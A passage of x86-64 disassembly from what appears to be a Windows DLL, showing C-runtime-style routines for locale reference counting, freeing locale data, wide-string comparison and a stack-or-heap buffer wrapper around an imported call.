   180009f34:	48 8b 8b 10 01 00 00 	mov    0x110(%rbx),%rcx
   180009f3b:	bf 80 00 00 00       	mov    $0x80,%edi
   180009f40:	48 2b cf             	sub    %rdi,%rcx
   180009f43:	e8 28 cb ff ff       	call   0x180006a70
   180009f48:	48 8b 8b 18 01 00 00 	mov    0x118(%rbx),%rcx
   180009f4f:	48 2b cf             	sub    %rdi,%rcx
   180009f52:	e8 19 cb ff ff       	call   0x180006a70
   180009f57:	48 8b 8b 00 01 00 00 	mov    0x100(%rbx),%rcx
   180009f5e:	e8 0d cb ff ff       	call   0x180006a70
   180009f63:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   180009f6a:	e8 a5 00 00 00       	call   0x18000a014
   180009f6f:	48 8d b3 28 01 00 00 	lea    0x128(%rbx),%rsi
   180009f76:	bd 06 00 00 00       	mov    $0x6,%ebp
   180009f7b:	48 8d 7b 38          	lea    0x38(%rbx),%rdi
   180009f7f:	48 8d 05 82 02 01 00 	lea    0x10282(%rip),%rax        # 0x18001a208
   180009f86:	48 39 47 f0          	cmp    %rax,-0x10(%rdi)
   180009f8a:	74 1a                	je     0x180009fa6
   180009f8c:	48 8b 0f             	mov    (%rdi),%rcx
   180009f8f:	48 85 c9             	test   %rcx,%rcx
   180009f92:	74 12                	je     0x180009fa6
   180009f94:	83 39 00             	cmpl   $0x0,(%rcx)
   180009f97:	75 0d                	jne    0x180009fa6
   180009f99:	e8 d2 ca ff ff       	call   0x180006a70
   180009f9e:	48 8b 0e             	mov    (%rsi),%rcx
   180009fa1:	e8 ca ca ff ff       	call   0x180006a70
   180009fa6:	48 83 7f e8 00       	cmpq   $0x0,-0x18(%rdi)
   180009fab:	74 13                	je     0x180009fc0
   180009fad:	48 8b 4f f8          	mov    -0x8(%rdi),%rcx
   180009fb1:	48 85 c9             	test   %rcx,%rcx
   180009fb4:	74 0a                	je     0x180009fc0
   180009fb6:	83 39 00             	cmpl   $0x0,(%rcx)
   180009fb9:	75 05                	jne    0x180009fc0
   180009fbb:	e8 b0 ca ff ff       	call   0x180006a70
   180009fc0:	48 83 c6 08          	add    $0x8,%rsi
   180009fc4:	48 83 c7 20          	add    $0x20,%rdi
   180009fc8:	48 83 ed 01          	sub    $0x1,%rbp
   180009fcc:	75 b1                	jne    0x180009f7f
   180009fce:	48 8b cb             	mov    %rbx,%rcx
   180009fd1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180009fd6:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180009fdb:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180009fe0:	48 83 c4 20          	add    $0x20,%rsp
   180009fe4:	5f                   	pop    %rdi
   180009fe5:	e9 86 ca ff ff       	jmp    0x180006a70
   180009fea:	cc                   	int3
   180009feb:	cc                   	int3
   180009fec:	48 85 c9             	test   %rcx,%rcx
   180009fef:	74 1c                	je     0x18000a00d
   180009ff1:	48 8d 05 28 66 00 00 	lea    0x6628(%rip),%rax        # 0x180010620
   180009ff8:	48 3b c8             	cmp    %rax,%rcx
   180009ffb:	74 10                	je     0x18000a00d
   180009ffd:	b8 01 00 00 00       	mov    $0x1,%eax
   18000a002:	f0 0f c1 81 5c 01 00 	lock xadd %eax,0x15c(%rcx)
   18000a009:	00 
   18000a00a:	ff c0                	inc    %eax
   18000a00c:	c3                   	ret
   18000a00d:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   18000a012:	c3                   	ret
   18000a013:	cc                   	int3
   18000a014:	48 85 c9             	test   %rcx,%rcx
   18000a017:	74 31                	je     0x18000a04a
   18000a019:	53                   	push   %rbx
   18000a01a:	48 83 ec 20          	sub    $0x20,%rsp
   18000a01e:	48 8d 05 fb 65 00 00 	lea    0x65fb(%rip),%rax        # 0x180010620
   18000a025:	48 8b d9             	mov    %rcx,%rbx
   18000a028:	48 3b c8             	cmp    %rax,%rcx
   18000a02b:	74 18                	je     0x18000a045
   18000a02d:	8b 81 5c 01 00 00    	mov    0x15c(%rcx),%eax
   18000a033:	90                   	nop
   18000a034:	85 c0                	test   %eax,%eax
   18000a036:	75 0d                	jne    0x18000a045
   18000a038:	e8 63 03 00 00       	call   0x18000a3a0
   18000a03d:	48 8b cb             	mov    %rbx,%rcx
   18000a040:	e8 2b ca ff ff       	call   0x180006a70
   18000a045:	48 83 c4 20          	add    $0x20,%rsp
   18000a049:	5b                   	pop    %rbx
   18000a04a:	c3                   	ret
   18000a04b:	cc                   	int3
   18000a04c:	48 85 c9             	test   %rcx,%rcx
   18000a04f:	74 1a                	je     0x18000a06b
   18000a051:	48 8d 05 c8 65 00 00 	lea    0x65c8(%rip),%rax        # 0x180010620
   18000a058:	48 3b c8             	cmp    %rax,%rcx
   18000a05b:	74 0e                	je     0x18000a06b
   18000a05d:	83 c8 ff             	or     $0xffffffff,%eax
   18000a060:	f0 0f c1 81 5c 01 00 	lock xadd %eax,0x15c(%rcx)
   18000a067:	00 
   18000a068:	ff c8                	dec    %eax
   18000a06a:	c3                   	ret
   18000a06b:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   18000a070:	c3                   	ret
   18000a071:	cc                   	int3
   18000a072:	cc                   	int3
   18000a073:	cc                   	int3
   18000a074:	48 83 ec 28          	sub    $0x28,%rsp
   18000a078:	48 85 c9             	test   %rcx,%rcx
   18000a07b:	0f 84 96 00 00 00    	je     0x18000a117
   18000a081:	41 83 c9 ff          	or     $0xffffffff,%r9d
   18000a085:	f0 44 01 49 10       	lock add %r9d,0x10(%rcx)
   18000a08a:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   18000a091:	48 85 c0             	test   %rax,%rax
   18000a094:	74 04                	je     0x18000a09a
   18000a096:	f0 44 01 08          	lock add %r9d,(%rax)
   18000a09a:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   18000a0a1:	48 85 c0             	test   %rax,%rax
   18000a0a4:	74 04                	je     0x18000a0aa
   18000a0a6:	f0 44 01 08          	lock add %r9d,(%rax)
   18000a0aa:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   18000a0b1:	48 85 c0             	test   %rax,%rax
   18000a0b4:	74 04                	je     0x18000a0ba
   18000a0b6:	f0 44 01 08          	lock add %r9d,(%rax)
   18000a0ba:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   18000a0c1:	48 85 c0             	test   %rax,%rax
   18000a0c4:	74 04                	je     0x18000a0ca
   18000a0c6:	f0 44 01 08          	lock add %r9d,(%rax)
   18000a0ca:	48 8d 41 38          	lea    0x38(%rcx),%rax
   18000a0ce:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   18000a0d4:	48 8d 15 2d 01 01 00 	lea    0x1012d(%rip),%rdx        # 0x18001a208
   18000a0db:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   18000a0df:	74 0c                	je     0x18000a0ed
   18000a0e1:	48 8b 10             	mov    (%rax),%rdx
   18000a0e4:	48 85 d2             	test   %rdx,%rdx
   18000a0e7:	74 04                	je     0x18000a0ed
   18000a0e9:	f0 44 01 0a          	lock add %r9d,(%rdx)
   18000a0ed:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   18000a0f2:	74 0d                	je     0x18000a101
   18000a0f4:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   18000a0f8:	48 85 d2             	test   %rdx,%rdx
   18000a0fb:	74 04                	je     0x18000a101
   18000a0fd:	f0 44 01 0a          	lock add %r9d,(%rdx)
   18000a101:	48 83 c0 20          	add    $0x20,%rax
   18000a105:	49 83 e8 01          	sub    $0x1,%r8
   18000a109:	75 c9                	jne    0x18000a0d4
   18000a10b:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   18000a112:	e8 35 ff ff ff       	call   0x18000a04c
   18000a117:	48 83 c4 28          	add    $0x28,%rsp
   18000a11b:	c3                   	ret
   18000a11c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000a121:	57                   	push   %rdi
   18000a122:	48 83 ec 20          	sub    $0x20,%rsp
   18000a126:	e8 6d c4 ff ff       	call   0x180006598
   18000a12b:	48 8d b8 90 00 00 00 	lea    0x90(%rax),%rdi
   18000a132:	8b 88 a8 03 00 00    	mov    0x3a8(%rax),%ecx
   18000a138:	8b 05 1a 07 01 00    	mov    0x1071a(%rip),%eax        # 0x18001a858
   18000a13e:	85 c8                	test   %ecx,%eax
   18000a140:	74 08                	je     0x18000a14a
   18000a142:	48 8b 1f             	mov    (%rdi),%rbx
   18000a145:	48 85 db             	test   %rbx,%rbx
   18000a148:	75 2c                	jne    0x18000a176
   18000a14a:	b9 04 00 00 00       	mov    $0x4,%ecx
   18000a14f:	e8 c4 c7 ff ff       	call   0x180006918
   18000a154:	90                   	nop
   18000a155:	48 8b 15 fc 0b 01 00 	mov    0x10bfc(%rip),%rdx        # 0x18001ad58
   18000a15c:	48 8b cf             	mov    %rdi,%rcx
   18000a15f:	e8 28 00 00 00       	call   0x18000a18c
   18000a164:	48 8b d8             	mov    %rax,%rbx
   18000a167:	b9 04 00 00 00       	mov    $0x4,%ecx
   18000a16c:	e8 fb c7 ff ff       	call   0x18000696c
   18000a171:	48 85 db             	test   %rbx,%rbx
   18000a174:	74 0e                	je     0x18000a184
   18000a176:	48 8b c3             	mov    %rbx,%rax
   18000a179:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000a17e:	48 83 c4 20          	add    $0x20,%rsp
   18000a182:	5f                   	pop    %rdi
   18000a183:	c3                   	ret
   18000a184:	e8 e7 b8 ff ff       	call   0x180005a70
   18000a189:	90                   	nop
   18000a18a:	cc                   	int3
   18000a18b:	cc                   	int3
   18000a18c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000a191:	57                   	push   %rdi
   18000a192:	48 83 ec 20          	sub    $0x20,%rsp
   18000a196:	48 8b fa             	mov    %rdx,%rdi
   18000a199:	48 85 d2             	test   %rdx,%rdx
   18000a19c:	74 46                	je     0x18000a1e4
   18000a19e:	48 85 c9             	test   %rcx,%rcx
   18000a1a1:	74 41                	je     0x18000a1e4
   18000a1a3:	48 8b 19             	mov    (%rcx),%rbx
   18000a1a6:	48 3b da             	cmp    %rdx,%rbx
   18000a1a9:	75 05                	jne    0x18000a1b0
   18000a1ab:	48 8b c7             	mov    %rdi,%rax
   18000a1ae:	eb 36                	jmp    0x18000a1e6
   18000a1b0:	48 89 39             	mov    %rdi,(%rcx)
   18000a1b3:	48 8b cf             	mov    %rdi,%rcx
   18000a1b6:	e8 2d fc ff ff       	call   0x180009de8
   18000a1bb:	48 85 db             	test   %rbx,%rbx
   18000a1be:	74 eb                	je     0x18000a1ab
   18000a1c0:	48 8b cb             	mov    %rbx,%rcx
   18000a1c3:	e8 ac fe ff ff       	call   0x18000a074
   18000a1c8:	83 7b 10 00          	cmpl   $0x0,0x10(%rbx)
   18000a1cc:	75 dd                	jne    0x18000a1ab
   18000a1ce:	48 8d 05 cb fe 00 00 	lea    0xfecb(%rip),%rax        # 0x18001a0a0
   18000a1d5:	48 3b d8             	cmp    %rax,%rbx
   18000a1d8:	74 d1                	je     0x18000a1ab
   18000a1da:	48 8b cb             	mov    %rbx,%rcx
   18000a1dd:	e8 92 fc ff ff       	call   0x180009e74
   18000a1e2:	eb c7                	jmp    0x18000a1ab
   18000a1e4:	33 c0                	xor    %eax,%eax
   18000a1e6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000a1eb:	48 83 c4 20          	add    $0x20,%rsp
   18000a1ef:	5f                   	pop    %rdi
   18000a1f0:	c3                   	ret
   18000a1f1:	cc                   	int3
   18000a1f2:	cc                   	int3
   18000a1f3:	cc                   	int3
   18000a1f4:	48 85 c9             	test   %rcx,%rcx
   18000a1f7:	0f 84 00 01 00 00    	je     0x18000a2fd
   18000a1fd:	53                   	push   %rbx
   18000a1fe:	48 83 ec 20          	sub    $0x20,%rsp
   18000a202:	48 8b d9             	mov    %rcx,%rbx
   18000a205:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   18000a209:	48 3b 0d 68 06 01 00 	cmp    0x10668(%rip),%rcx        # 0x18001a878
   18000a210:	74 05                	je     0x18000a217
   18000a212:	e8 59 c8 ff ff       	call   0x180006a70
   18000a217:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   18000a21b:	48 3b 0d 5e 06 01 00 	cmp    0x1065e(%rip),%rcx        # 0x18001a880
   18000a222:	74 05                	je     0x18000a229
   18000a224:	e8 47 c8 ff ff       	call   0x180006a70
   18000a229:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   18000a22d:	48 3b 0d 54 06 01 00 	cmp    0x10654(%rip),%rcx        # 0x18001a888
   18000a234:	74 05                	je     0x18000a23b
   18000a236:	e8 35 c8 ff ff       	call   0x180006a70
   18000a23b:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   18000a23f:	48 3b 0d 4a 06 01 00 	cmp    0x1064a(%rip),%rcx        # 0x18001a890
   18000a246:	74 05                	je     0x18000a24d
   18000a248:	e8 23 c8 ff ff       	call   0x180006a70
   18000a24d:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   18000a251:	48 3b 0d 40 06 01 00 	cmp    0x10640(%rip),%rcx        # 0x18001a898
   18000a258:	74 05                	je     0x18000a25f
   18000a25a:	e8 11 c8 ff ff       	call   0x180006a70
   18000a25f:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   18000a263:	48 3b 0d 36 06 01 00 	cmp    0x10636(%rip),%rcx        # 0x18001a8a0
   18000a26a:	74 05                	je     0x18000a271
   18000a26c:	e8 ff c7 ff ff       	call   0x180006a70
   18000a271:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   18000a275:	48 3b 0d 2c 06 01 00 	cmp    0x1062c(%rip),%rcx        # 0x18001a8a8
   18000a27c:	74 05                	je     0x18000a283
   18000a27e:	e8 ed c7 ff ff       	call   0x180006a70
   18000a283:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   18000a287:	48 3b 0d 3a 06 01 00 	cmp    0x1063a(%rip),%rcx        # 0x18001a8c8
   18000a28e:	74 05                	je     0x18000a295
   18000a290:	e8 db c7 ff ff       	call   0x180006a70
   18000a295:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   18000a299:	48 3b 0d 30 06 01 00 	cmp    0x10630(%rip),%rcx        # 0x18001a8d0
   18000a2a0:	74 05                	je     0x18000a2a7
   18000a2a2:	e8 c9 c7 ff ff       	call   0x180006a70
   18000a2a7:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   18000a2ab:	48 3b 0d 26 06 01 00 	cmp    0x10626(%rip),%rcx        # 0x18001a8d8
   18000a2b2:	74 05                	je     0x18000a2b9
   18000a2b4:	e8 b7 c7 ff ff       	call   0x180006a70
   18000a2b9:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   18000a2c0:	48 3b 0d 19 06 01 00 	cmp    0x10619(%rip),%rcx        # 0x18001a8e0
   18000a2c7:	74 05                	je     0x18000a2ce
   18000a2c9:	e8 a2 c7 ff ff       	call   0x180006a70
   18000a2ce:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   18000a2d5:	48 3b 0d 0c 06 01 00 	cmp    0x1060c(%rip),%rcx        # 0x18001a8e8
   18000a2dc:	74 05                	je     0x18000a2e3
   18000a2de:	e8 8d c7 ff ff       	call   0x180006a70
   18000a2e3:	48 8b 8b 90 00 00 00 	mov    0x90(%rbx),%rcx
   18000a2ea:	48 3b 0d ff 05 01 00 	cmp    0x105ff(%rip),%rcx        # 0x18001a8f0
   18000a2f1:	74 05                	je     0x18000a2f8
   18000a2f3:	e8 78 c7 ff ff       	call   0x180006a70
   18000a2f8:	48 83 c4 20          	add    $0x20,%rsp
   18000a2fc:	5b                   	pop    %rbx
   18000a2fd:	c3                   	ret
   18000a2fe:	cc                   	int3
   18000a2ff:	cc                   	int3
   18000a300:	48 85 c9             	test   %rcx,%rcx
   18000a303:	74 66                	je     0x18000a36b
   18000a305:	53                   	push   %rbx
   18000a306:	48 83 ec 20          	sub    $0x20,%rsp
   18000a30a:	48 8b d9             	mov    %rcx,%rbx
   18000a30d:	48 8b 09             	mov    (%rcx),%rcx
   18000a310:	48 3b 0d 49 05 01 00 	cmp    0x10549(%rip),%rcx        # 0x18001a860
   18000a317:	74 05                	je     0x18000a31e
   18000a319:	e8 52 c7 ff ff       	call   0x180006a70
   18000a31e:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   18000a322:	48 3b 0d 3f 05 01 00 	cmp    0x1053f(%rip),%rcx        # 0x18001a868
   18000a329:	74 05                	je     0x18000a330
   18000a32b:	e8 40 c7 ff ff       	call   0x180006a70
   18000a330:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   18000a334:	48 3b 0d 35 05 01 00 	cmp    0x10535(%rip),%rcx        # 0x18001a870
   18000a33b:	74 05                	je     0x18000a342
   18000a33d:	e8 2e c7 ff ff       	call   0x180006a70
   18000a342:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   18000a346:	48 3b 0d 6b 05 01 00 	cmp    0x1056b(%rip),%rcx        # 0x18001a8b8
   18000a34d:	74 05                	je     0x18000a354
   18000a34f:	e8 1c c7 ff ff       	call   0x180006a70
   18000a354:	48 8b 4b 60          	mov    0x60(%rbx),%rcx
   18000a358:	48 3b 0d 61 05 01 00 	cmp    0x10561(%rip),%rcx        # 0x18001a8c0
   18000a35f:	74 05                	je     0x18000a366
   18000a361:	e8 0a c7 ff ff       	call   0x180006a70
   18000a366:	48 83 c4 20          	add    $0x20,%rsp
   18000a36a:	5b                   	pop    %rbx
   18000a36b:	c3                   	ret
   18000a36c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000a371:	57                   	push   %rdi
   18000a372:	48 83 ec 20          	sub    $0x20,%rsp
   18000a376:	48 8d 3c d1          	lea    (%rcx,%rdx,8),%rdi
   18000a37a:	48 8b d9             	mov    %rcx,%rbx
   18000a37d:	48 3b cf             	cmp    %rdi,%rcx
   18000a380:	74 11                	je     0x18000a393
   18000a382:	48 8b 0b             	mov    (%rbx),%rcx
   18000a385:	e8 e6 c6 ff ff       	call   0x180006a70
   18000a38a:	48 83 c3 08          	add    $0x8,%rbx
   18000a38e:	48 3b df             	cmp    %rdi,%rbx
   18000a391:	75 ef                	jne    0x18000a382
   18000a393:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000a398:	48 83 c4 20          	add    $0x20,%rsp
   18000a39c:	5f                   	pop    %rdi
   18000a39d:	c3                   	ret
   18000a39e:	cc                   	int3
   18000a39f:	cc                   	int3
   18000a3a0:	48 85 c9             	test   %rcx,%rcx
   18000a3a3:	0f 84 fe 00 00 00    	je     0x18000a4a7
   18000a3a9:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000a3ae:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000a3b3:	56                   	push   %rsi
   18000a3b4:	48 83 ec 20          	sub    $0x20,%rsp
   18000a3b8:	bd 07 00 00 00       	mov    $0x7,%ebp
   18000a3bd:	48 8b d9             	mov    %rcx,%rbx
   18000a3c0:	8b d5                	mov    %ebp,%edx
   18000a3c2:	e8 a5 ff ff ff       	call   0x18000a36c
   18000a3c7:	48 8d 4b 38          	lea    0x38(%rbx),%rcx
   18000a3cb:	8b d5                	mov    %ebp,%edx
   18000a3cd:	e8 9a ff ff ff       	call   0x18000a36c
   18000a3d2:	8d 75 05             	lea    0x5(%rbp),%esi
   18000a3d5:	8b d6                	mov    %esi,%edx
   18000a3d7:	48 8d 4b 70          	lea    0x70(%rbx),%rcx
   18000a3db:	e8 8c ff ff ff       	call   0x18000a36c
   18000a3e0:	48 8d 8b d0 00 00 00 	lea    0xd0(%rbx),%rcx
   18000a3e7:	8b d6                	mov    %esi,%edx
   18000a3e9:	e8 7e ff ff ff       	call   0x18000a36c
   18000a3ee:	48 8d 8b 30 01 00 00 	lea    0x130(%rbx),%rcx
   18000a3f5:	8d 55 fb             	lea    -0x5(%rbp),%edx
   18000a3f8:	e8 6f ff ff ff       	call   0x18000a36c
   18000a3fd:	48 8b 8b 40 01 00 00 	mov    0x140(%rbx),%rcx
   18000a404:	e8 67 c6 ff ff       	call   0x180006a70
   18000a409:	48 8b 8b 48 01 00 00 	mov    0x148(%rbx),%rcx
   18000a410:	e8 5b c6 ff ff       	call   0x180006a70
   18000a415:	48 8b 8b 50 01 00 00 	mov    0x150(%rbx),%rcx
   18000a41c:	e8 4f c6 ff ff       	call   0x180006a70
   18000a421:	48 8d 8b 60 01 00 00 	lea    0x160(%rbx),%rcx
   18000a428:	8b d5                	mov    %ebp,%edx
   18000a42a:	e8 3d ff ff ff       	call   0x18000a36c
   18000a42f:	48 8d 8b 98 01 00 00 	lea    0x198(%rbx),%rcx
   18000a436:	8b d5                	mov    %ebp,%edx
   18000a438:	e8 2f ff ff ff       	call   0x18000a36c
   18000a43d:	48 8d 8b d0 01 00 00 	lea    0x1d0(%rbx),%rcx
   18000a444:	8b d6                	mov    %esi,%edx
   18000a446:	e8 21 ff ff ff       	call   0x18000a36c
   18000a44b:	48 8d 8b 30 02 00 00 	lea    0x230(%rbx),%rcx
   18000a452:	8b d6                	mov    %esi,%edx
   18000a454:	e8 13 ff ff ff       	call   0x18000a36c
   18000a459:	48 8d 8b 90 02 00 00 	lea    0x290(%rbx),%rcx
   18000a460:	8d 55 fb             	lea    -0x5(%rbp),%edx
   18000a463:	e8 04 ff ff ff       	call   0x18000a36c
   18000a468:	48 8b 8b a0 02 00 00 	mov    0x2a0(%rbx),%rcx
   18000a46f:	e8 fc c5 ff ff       	call   0x180006a70
   18000a474:	48 8b 8b a8 02 00 00 	mov    0x2a8(%rbx),%rcx
   18000a47b:	e8 f0 c5 ff ff       	call   0x180006a70
   18000a480:	48 8b 8b b0 02 00 00 	mov    0x2b0(%rbx),%rcx
   18000a487:	e8 e4 c5 ff ff       	call   0x180006a70
   18000a48c:	48 8b 8b b8 02 00 00 	mov    0x2b8(%rbx),%rcx
   18000a493:	e8 d8 c5 ff ff       	call   0x180006a70
   18000a498:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000a49d:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   18000a4a2:	48 83 c4 20          	add    $0x20,%rsp
   18000a4a6:	5e                   	pop    %rsi
   18000a4a7:	c3                   	ret
   18000a4a8:	cc                   	int3
   18000a4a9:	cc                   	int3
   18000a4aa:	cc                   	int3
   18000a4ab:	cc                   	int3
   18000a4ac:	cc                   	int3
   18000a4ad:	cc                   	int3
   18000a4ae:	cc                   	int3
   18000a4af:	cc                   	int3
   18000a4b0:	4d 85 c0             	test   %r8,%r8
   18000a4b3:	75 03                	jne    0x18000a4b8
   18000a4b5:	33 c0                	xor    %eax,%eax
   18000a4b7:	c3                   	ret
   18000a4b8:	49 83 e8 01          	sub    $0x1,%r8
   18000a4bc:	74 1d                	je     0x18000a4db
   18000a4be:	66 90                	xchg   %ax,%ax
   18000a4c0:	0f b7 01             	movzwl (%rcx),%eax
   18000a4c3:	66 85 c0             	test   %ax,%ax
   18000a4c6:	74 13                	je     0x18000a4db
   18000a4c8:	66 3b 02             	cmp    (%rdx),%ax
   18000a4cb:	75 0e                	jne    0x18000a4db
   18000a4cd:	48 83 c1 02          	add    $0x2,%rcx
   18000a4d1:	48 83 c2 02          	add    $0x2,%rdx
   18000a4d5:	49 83 e8 01          	sub    $0x1,%r8
   18000a4d9:	75 e5                	jne    0x18000a4c0
   18000a4db:	0f b7 01             	movzwl (%rcx),%eax
   18000a4de:	0f b7 0a             	movzwl (%rdx),%ecx
   18000a4e1:	2b c1                	sub    %ecx,%eax
   18000a4e3:	c3                   	ret
   18000a4e4:	40 55                	rex push %rbp
   18000a4e6:	41 54                	push   %r12
   18000a4e8:	41 55                	push   %r13
   18000a4ea:	41 56                	push   %r14
   18000a4ec:	41 57                	push   %r15
   18000a4ee:	48 83 ec 60          	sub    $0x60,%rsp
   18000a4f2:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   18000a4f7:	48 89 5d 60          	mov    %rbx,0x60(%rbp)
   18000a4fb:	48 89 75 68          	mov    %rsi,0x68(%rbp)
   18000a4ff:	48 89 7d 70          	mov    %rdi,0x70(%rbp)
   18000a503:	48 8b 05 f6 fa 00 00 	mov    0xfaf6(%rip),%rax        # 0x18001a000
   18000a50a:	48 33 c5             	xor    %rbp,%rax
   18000a50d:	48 89 45 28          	mov    %rax,0x28(%rbp)
   18000a511:	44 8b ea             	mov    %edx,%r13d
   18000a514:	45 8b f9             	mov    %r9d,%r15d
   18000a517:	48 8b d1             	mov    %rcx,%rdx
   18000a51a:	4d 8b e0             	mov    %r8,%r12
   18000a51d:	48 8d 4d 08          	lea    0x8(%rbp),%rcx
   18000a521:	e8 1a a4 ff ff       	call   0x180004940
   18000a526:	8b bd 88 00 00 00    	mov    0x88(%rbp),%edi
   18000a52c:	85 ff                	test   %edi,%edi
   18000a52e:	75 07                	jne    0x18000a537
   18000a530:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000a534:	8b 78 0c             	mov    0xc(%rax),%edi
   18000a537:	f7 9d 90 00 00 00    	negl   0x90(%rbp)
   18000a53d:	45 8b cf             	mov    %r15d,%r9d
   18000a540:	4d 8b c4             	mov    %r12,%r8
   18000a543:	8b cf                	mov    %edi,%ecx
   18000a545:	1b d2                	sbb    %edx,%edx
   18000a547:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   18000a54c:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   18000a552:	83 e2 08             	and    $0x8,%edx
   18000a555:	ff c2                	inc    %edx
   18000a557:	e8 30 de ff ff       	call   0x18000838c
   18000a55c:	4c 63 f0             	movslq %eax,%r14
   18000a55f:	85 c0                	test   %eax,%eax
   18000a561:	75 07                	jne    0x18000a56a
   18000a563:	33 ff                	xor    %edi,%edi
   18000a565:	e9 d0 00 00 00       	jmp    0x18000a63a
   18000a56a:	49 8b f6             	mov    %r14,%rsi
   18000a56d:	48 03 f6             	add    %rsi,%rsi
   18000a570:	48 8d 46 10          	lea    0x10(%rsi),%rax
   18000a574:	48 3b f0             	cmp    %rax,%rsi
   18000a577:	48 1b c9             	sbb    %rcx,%rcx
   18000a57a:	48 23 c8             	and    %rax,%rcx
   18000a57d:	0f 84 9d 00 00 00    	je     0x18000a620
   18000a583:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   18000a58a:	77 31                	ja     0x18000a5bd
   18000a58c:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   18000a590:	48 3b c1             	cmp    %rcx,%rax
   18000a593:	77 0a                	ja     0x18000a59f
   18000a595:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   18000a59c:	ff ff 0f 
   18000a59f:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   18000a5a3:	e8 88 2b 00 00       	call   0x18000d130
   18000a5a8:	48 2b e0             	sub    %rax,%rsp
   18000a5ab:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   18000a5b0:	48 85 db             	test   %rbx,%rbx
   18000a5b3:	74 6d                	je     0x18000a622
   18000a5b5:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   18000a5bb:	eb 13                	jmp    0x18000a5d0
   18000a5bd:	e8 2e f2 ff ff       	call   0x1800097f0
   18000a5c2:	48 8b d8             	mov    %rax,%rbx
   18000a5c5:	48 85 c0             	test   %rax,%rax
   18000a5c8:	74 0a                	je     0x18000a5d4
   18000a5ca:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   18000a5d0:	48 83 c3 10          	add    $0x10,%rbx
   18000a5d4:	48 85 db             	test   %rbx,%rbx
   18000a5d7:	74 49                	je     0x18000a622
   18000a5d9:	4c 8b c6             	mov    %rsi,%r8
   18000a5dc:	33 d2                	xor    %edx,%edx
   18000a5de:	48 8b cb             	mov    %rbx,%rcx
   18000a5e1:	e8 ca 33 00 00       	call   0x18000d9b0
   18000a5e6:	45 8b cf             	mov    %r15d,%r9d
   18000a5e9:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   18000a5ee:	4d 8b c4             	mov    %r12,%r8
   18000a5f1:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   18000a5f6:	ba 01 00 00 00       	mov    $0x1,%edx
   18000a5fb:	8b cf                	mov    %edi,%ecx
   18000a5fd:	e8 8a dd ff ff       	call   0x18000838c
   18000a602:	85 c0                	test   %eax,%eax
   18000a604:	74 1c                	je     0x18000a622
   18000a606:	4c 8b 8d 80 00 00 00 	mov    0x80(%rbp),%r9
   18000a60d:	44 8b c0             	mov    %eax,%r8d
   18000a610:	48 8b d3             	mov    %rbx,%rdx
   18000a613:	41 8b cd             	mov    %r13d,%ecx
   18000a616:	ff 15 cc 4b 00 00    	call   *0x4bcc(%rip)        # 0x18000f1e8
   18000a61c:	8b f8                	mov    %eax,%edi
   18000a61e:	eb 09                	jmp    0x18000a629
   18000a620:	33 db                	xor    %ebx,%ebx
   18000a622:	33 ff                	xor    %edi,%edi
   18000a624:	48 85 db             	test   %rbx,%rbx
   18000a627:	74 11                	je     0x18000a63a
   18000a629:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   18000a62d:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   18000a633:	75 05                	jne    0x18000a63a
   18000a635:	e8 36 c4 ff ff       	call   0x180006a70
   18000a63a:	80 7d 20 00          	cmpb   $0x0,0x20(%rbp)
   18000a63e:	74 0b                	je     0x18000a64b
   18000a640:	48 8b 45 08          	mov    0x8(%rbp),%rax
